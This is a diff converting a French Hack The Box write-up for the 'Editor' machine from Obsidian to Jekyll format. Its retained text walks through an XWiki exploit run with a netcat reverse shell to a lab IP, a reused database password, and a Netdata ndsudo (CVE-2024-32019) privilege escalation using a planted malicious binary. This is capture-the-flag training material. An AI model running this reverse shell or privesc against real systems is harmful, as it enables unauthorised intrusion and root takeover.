@@ -1,39 +1,43 @@
 ---
-tags:
-  - HTB
-  - machine
-date: 2025-09-18T19:00
-tasks:
-  - mise en page
-parent: "[[HTB MOC Linux]]"
-category: writeups
-difficulty: easy
-os: linux
+layout: writeup
 title: Editor Writeup
-Description: This is a writeup for the HTB Box "Editor"
-season: "8"
-seasonal: yes
+description: This is a writeup for the HTB Box "Editor"
+excerpt: This is a writeup for the HTB Box "Editor"
+date: 2025-09-18T19:00
+platform: htb
+permalink: /writeups/htb/season8/editor/
+os: linux
+difficulty: easy
+season: '8'
+tags:
+- HTB
+- linux
+- easy
+prev_url: /writeups/htb/season8/artificial/
+next_url: /writeups/htb/season8/outbound/
 ---
+
+{% raw %}
 
 # Enumeration
 
 On arrive sur une première page de présentation qui ne nous donne pas grand chose.
 
-![[Pasted image 20251105160214.png]]
+<img class="content-image" src="/assets/content/htb/season8-editor/Pasted%20image%2020251105160214.png" alt="Editor Writeup" loading="lazy">
 
 En revanche, en cliquant sur la page about, on est redirigé vers une page xwiki. Certes la page ne charge pas mais on voit tout de même que xwiki est présent.
 
-![[Pasted image 20251105155753.png]]
+<img class="content-image" src="/assets/content/htb/season8-editor/Pasted%20image%2020251105155753.png" alt="Editor Writeup" loading="lazy">
 
 En creusant un peu, on trouve un port de plus sur lequel on trouve notre instance xwiki.
 
-![[Pasted image 20251105161253.png]]
+<img class="content-image" src="/assets/content/htb/season8-editor/Pasted%20image%2020251105161253.png" alt="Editor Writeup" loading="lazy">
 
-![[Pasted image 20251105160115.png]]
+<img class="content-image" src="/assets/content/htb/season8-editor/Pasted%20image%2020251105160115.png" alt="Editor Writeup" loading="lazy">
 
 En descendant en bas de la page, on peut voir la version de cette instance xwiki.
 
-![[Pasted image 20251105161548.png]]
+<img class="content-image" src="/assets/content/htb/season8-editor/Pasted%20image%2020251105161548.png" alt="Editor Writeup" loading="lazy">
 
 On va donc chercher à exploiter cette version de xwiki en essayant de trouver une vulnérabilité.
 
@@ -56,9 +60,9 @@ Pour ceux qui n'utilisent pas trop meterpreter, c'est un module de metasploit, c
 python3 exploit.py -t 'http://editor.htb:8080' -c 'busybox nc 10.10.10.10 4444 -e /bin/bash'
 ```
 
-![[Pasted image 20251107151624.png]]
+<img class="content-image" src="/assets/content/htb/season8-editor/Pasted%20image%2020251107151624.png" alt="Editor Writeup" loading="lazy">
 
-![[Pasted image 20251107151644.png]]
+<img class="content-image" src="/assets/content/htb/season8-editor/Pasted%20image%2020251107151644.png" alt="Editor Writeup" loading="lazy">
 
 Et juste comme ça on obtient notre meterpreter. On récupère un shell que l'on améliore un peu:
 ```
@@ -110,7 +114,7 @@ qui nous donne des infos sur les db utilisées, notamment mysql.
     <mapping resource="mailsender.hbm.xml"/>
 ```
 
-![[Pasted image 20251111002817.png]]
+<img class="content-image" src="/assets/content/htb/season8-editor/Pasted%20image%2020251111002817.png" alt="Editor Writeup" loading="lazy">
 
 Les autres sont commentées, c'est bien celle-ci qui est utilisée. Une fois cela trouvé il ne nous reste plus qu'à utiliser les identifiants pour query la db. Avant toute chose on tente de se connecter en su puis en ssh. (On tente le ssh car si le su nous est interdit le message d'erreur sera le même que pour un mauvais mdp, aucun moyen de savoir).
 ```
@@ -119,7 +123,7 @@ theEd1t0rTeam99
 
 Et nous voilà sur le compte d'oliver.
 
-![[Pasted image 20251111135327.png]]
+<img class="content-image" src="/assets/content/htb/season8-editor/Pasted%20image%2020251111135327.png" alt="Editor Writeup" loading="lazy">
 
 # Privilege Escalation
 
@@ -138,16 +142,16 @@ Et on obtient une liste de plugins netdata.
 /opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
 ```
 
-![[Pasted image 20251111142719.png]]
+<img class="content-image" src="/assets/content/htb/season8-editor/Pasted%20image%2020251111142719.png" alt="Editor Writeup" loading="lazy">
 
 L'un d'eux retient notre attention: ndsudo. On regarde le fichier et on voit qu'il a bien le suid de set.
 
-![[Pasted image 20251111190604.png]]
+<img class="content-image" src="/assets/content/htb/season8-editor/Pasted%20image%2020251111190604.png" alt="Editor Writeup" loading="lazy">
 
 En cherchant rapidement sur internet on voit qu'une privesc est possible en utilisant ndsudo. En creusant encore plus, on trouve un site internet qui nous guide sur la privesc en utilisant ndsudo. Pour cela il nous suffit de placer un fichier exécutable malveillant, avec un nom dans la liste de ndsudo comme `nvme`.
 https://github.com/dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation
 
-![[Pasted image 20251111213505.png]]
+<img class="content-image" src="/assets/content/htb/season8-editor/Pasted%20image%2020251111213505.png" alt="Editor Writeup" loading="lazy">
 
 On écrit dans un fichier c, sur notre machine car editor n'a pas l'outil gcc, le code suivant.
 ```
@@ -183,8 +187,9 @@ Puis on l'exécute
 
 Et on obtient le root shell.
 
-![[Pasted image 20251111214013.png]]
+<img class="content-image" src="/assets/content/htb/season8-editor/Pasted%20image%2020251111214013.png" alt="Editor Writeup" loading="lazy">
 Et juste comme ça, on en a fini de la box!
 
-![[Pasted image 20251111213808.png]]
+<img class="content-image" src="/assets/content/htb/season8-editor/Pasted%20image%2020251111213808.png" alt="Editor Writeup" loading="lazy">
 
+{% endraw %}
